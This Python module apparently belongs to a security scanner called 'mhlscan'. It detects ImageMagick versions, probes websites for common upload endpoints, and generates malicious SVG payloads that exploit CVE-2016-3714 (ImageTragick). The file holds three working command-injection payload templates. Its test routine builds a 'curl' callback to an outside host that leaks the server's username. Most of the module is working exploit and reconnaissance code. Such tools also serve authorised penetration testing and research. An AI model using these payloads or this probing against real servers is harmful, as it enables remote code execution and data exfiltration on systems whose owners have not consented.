# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_imagemagick.py - CVE-2016-3714 (ImageTragick) payload generator + discovery."""

import os
import re
import random
import string
from pathlib import Path
from urllib.parse import urlparse
import requests


PAYLOAD_DIR = Path.home() / ".mhlscan" / "payloads"
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)


# Payload templates berdasarkan vector
PAYLOAD_TEMPLATES = {
    "ghostscript_desc": """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<hui>
  <desc>copies (%pipe%/tmp/;{cmd}) (r) file showpage 0 quit </desc>
  <image href="epi:/proc/self/fd/3" />
  <svg width="1px" height="1px" />
</hui>""",

    "imagetragick_pipe": """<svg width="640" height="480" xmlns="http://www.w3.org/2000/svg">
<image href="https://example.com" size="1,1" x="0" y="0" width="640" height="480"/>
<image href="https://example.com" size="1,1" x="0" y="0" width="640" height="480" />
<desc>%pipe%{cmd}</desc>
<image href="%pipe%{cmd}" />
</svg>""",

    "imagetragick_url": """<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com" size="1,1" x="0" y="0"/>
<image xlink:href="{payload}" size="1,1" x="0" y="0"/>
</svg>""",
}


# Version yang vulnerable
VULNERABLE_VERSIONS = {
    "6": lambda v: _version_lt(v, "6.9.3-9"),
    "7": lambda v: _version_lt(v, "7.0.1-1"),
}


def _version_lt(v, target):
    """Compare versions like 6.9.2 < 6.9.3-9."""
    try:
        v_parts = re.findall(r'\d+', v)
        t_parts = re.findall(r'\d+', target)
        for i in range(min(len(v_parts), len(t_parts))):
            if int(v_parts[i]) < int(t_parts[i]):
                return True
            if int(v_parts[i]) > int(t_parts[i]):
                return False
        return len(v_parts) < len(t_parts)
    except Exception:
        return False


def is_vulnerable_version(version):
    """Check if version < 6.9.3-9 (IM6) or < 7.0.1-1 (IM7)."""
    if not version:
        return False
    major = version.split(".")[0]
    if major in VULNERABLE_VERSIONS:
        return VULNERABLE_VERSIONS[major](version)
    return False


# ============================================================
# DISCOVERY
# ============================================================
def detect_imagemagick(url, timeout=5):
    """Detect ImageMagick version from various sources."""
    signatures = [
        (r"ImageMagick[ /](\d+\.\d+\.\d+(?:-\d+)?)", "header/body"),
        (r"IM (\d+\.\d+\.\d+)", "server-status"),
        (r"ImageMagick\s+v?(\d+\.\d+\.\d+(?:-\d+)?)", "body"),
    ]

    probes = [
        "/", "/phpinfo.php", "/info.php", "/server-status",
        "/magick/", "/imagick/", "/test.php",
    ]

    for path in probes:
        try:
            r = requests.get(url.rstrip("/") + path, timeout=timeout,
                             verify=False, allow_redirects=True)
            text = r.text + str(r.headers)
            for pattern, _ in signatures:
                m = re.search(pattern, text, re.IGNORECASE)
                if m:
                    v = m.group(1)
                    return {
                        "version": v,
                        "vulnerable": is_vulnerable_version(v),
                        "evidence": path,
                    }
        except Exception:
            pass

    return {"version": None, "vulnerable": None, "evidence": None}


def discover_upload_endpoints(url, timeout=5):
    """Probe common upload endpoints."""
    endpoints = [
        # WordPress
        ("/wp-admin/async-upload.php", "wordpress-upload"),
        ("/wp-json/wp/v2/media", "wordpress-rest-media"),
        # Generic PHP
        ("/upload.php", "php-upload"),
        ("/upload.php?action=upload", "php-upload-action"),
        ("/fileupload", "generic-upload"),
        ("/upload", "generic-upload"),
        # API
        ("/api/upload", "api-upload"),
        ("/api/v1/upload", "api-v1-upload"),
        ("/api/v2/upload", "api-v2-upload"),
        # Image specific
        ("/image/upload", "image-upload"),
        ("/media/upload", "media-upload"),
        ("/avatar/upload", "avatar-upload"),
        ("/profile/avatar", "avatar-upload"),
        # CMS specific
        ("/administrator/components/com_media/", "joomla-media"),
        ("/sites/default/files/", "drupal-files"),
    ]

    found = []
    for path, label in endpoints:
        try:
            r = requests.get(url.rstrip("/") + path, timeout=timeout,
                             verify=False, allow_redirects=False)
            if r.status_code in (200, 401, 403, 302):
                found.append({
                    "path": path,
                    "label": label,
                    "status": r.status_code,
                })
        except Exception:
            pass
    return found


# ============================================================
# PAYLOAD GENERATION
# ============================================================
def generate_payload(cmd, template="ghostscript_desc"):
    """
    Generate malicious SVG payload.
    Returns (svg_content, filename).
    """
    if template not in PAYLOAD_TEMPLATES:
        template = "ghostscript_desc"

    # Escape command for GhostScript
    safe_cmd = cmd.replace(" ", "\x20").replace(";", "\x3b")

    if template == "imagetragick_url":
        payload_url = 'https://example.com"|{}"'.format(cmd)
        content = PAYLOAD_TEMPLATES[template].format(payload=payload_url)
    else:
        content = PAYLOAD_TEMPLATES[template].format(cmd=safe_cmd)

    # Random filename
    rand = "".join(random.choices(string.ascii_lowercase, k=8))
    filename = str(PAYLOAD_DIR / f"imagemagick_{rand}.svg")

    return content, filename


def save_payload(cmd, template="ghostscript_desc"):
    """Generate + save to disk. Returns path."""
    content, filepath = generate_payload(cmd, template)
    Path(filepath).write_text(content)
    return filepath


# ============================================================
# MAIN TEST FUNCTION (untuk integrasi ke mhlscan)
# ============================================================
def test_cve_2016_3714(url, oast_url=None, timeout=10):
    """
    Test CVE-2016-3714 on target.
    
    Args:
        url: target base URL
        oast_url: OAST callback URL (e.g., http://YOUR_IP:8888)
                  If None, only detection + payload generation
    
    Returns dict with:
        - vulnerable_version: bool/None
        - imagemagick_version: str/None
        - upload_endpoints: list of discovered endpoints
        - payload_file: path to saved payload
        - status: 'vulnerable' | 'potential' | 'not_vulnerable' | 'unknown'
    """
    result = {
        "vulnerable_version": None,
        "imagemagick_version": None,
        "upload_endpoints": [],
        "payload_file": None,
        "status": "unknown",
        "evidence": [],
    }

    # 1. Detect version
    version_info = detect_imagemagick(url, timeout)
    result["imagemagick_version"] = version_info["version"]
    result["vulnerable_version"] = version_info["vulnerable"]

    if version_info["version"]:
        if version_info["vulnerable"]:
            result["evidence"].append(
                "ImageMagick " + version_info["version"] + " (vulnerable)")
        else:
            result["evidence"].append(
                "ImageMagick " + version_info["version"] + " (patched)")

    # 2. Discover upload endpoints
    endpoints = discover_upload_endpoints(url, timeout)
    result["upload_endpoints"] = endpoints

    if endpoints:
        result["evidence"].append(
            str(len(endpoints)) + " upload endpoint(s) ditemukan")

    # 3. Generate payload
    # Use OAST URL if provided, else default echo
    if oast_url:
        cmd = 'curl+-s+http://{}/$(whoami)'.format(
            oast_url.replace("http://", "").replace("https://", ""))
    else:
        cmd = 'echo+IMAGEMAGICK_RCE_PROOF'

    payload_file = save_payload(cmd)
    result["payload_file"] = payload_file

    # 4. Determine status
    if version_info["vulnerable"] and endpoints:
        result["status"] = "potential"
        result["evidence"].append(
            "Kombinasi vulnerable version + upload endpoint = HIGH prob")
    elif version_info["vulnerable"] and not endpoints:
        result["status"] = "potential"
        result["evidence"].append(
            "Vulnerable version tapi upload endpoint belum ditemukan")
    elif not version_info["vulnerable"] and endpoints:
        result["status"] = "not_vulnerable"
        result["evidence"].append(
            "ImageMagick patched (tidak vulnerable)")
    elif version_info["version"] and not version_info["vulnerable"]:
        result["status"] = "not_vulnerable"
        result["evidence"].append("ImageMagick patched")
    else:
        result["status"] = "unknown"
        result["evidence"].append(
            "ImageMagick version tidak terdeteksi")

    return result
